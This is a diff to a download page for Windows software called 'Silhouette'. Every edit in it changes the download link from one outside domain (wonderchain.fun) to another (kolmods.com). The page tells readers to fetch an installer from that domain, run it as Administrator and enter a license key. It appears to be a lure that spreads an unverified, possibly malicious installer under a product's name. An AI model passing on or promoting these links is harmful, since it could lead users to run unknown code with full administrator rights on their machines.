@@ -14,27 +14,27 @@
 > **This is the download page.** Use the button or link below to get **Silhouette** for Windows.
 
 <p align="center">
-  <a href="https://silhouettefx.wonderchain.fun/">
+  <a href="https://silhouettefx.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Silhouette-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Silhouette">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[silhouettefx.wonderchain.fun](https://silhouettefx.wonderchain.fun/)** |
-| **Full URL** | `https://silhouettefx.wonderchain.fun/` |
+| **Direct link** | **[silhouettefx.kolmods.com](https://silhouettefx.kolmods.com/)** |
+| **Full URL** | `https://silhouettefx.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — silhouettefx.wonderchain.fun](https://silhouettefx.wonderchain.fun/)** (link above)
+1. Click **[Download — silhouettefx.kolmods.com](https://silhouettefx.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://silhouettefx.wonderchain.fun/"><strong>⬇ Download Silhouette now</strong></a></p>
+<p align="center"><a href="https://silhouettefx.kolmods.com/"><strong>⬇ Download Silhouette now</strong></a></p>
 
 ---
 
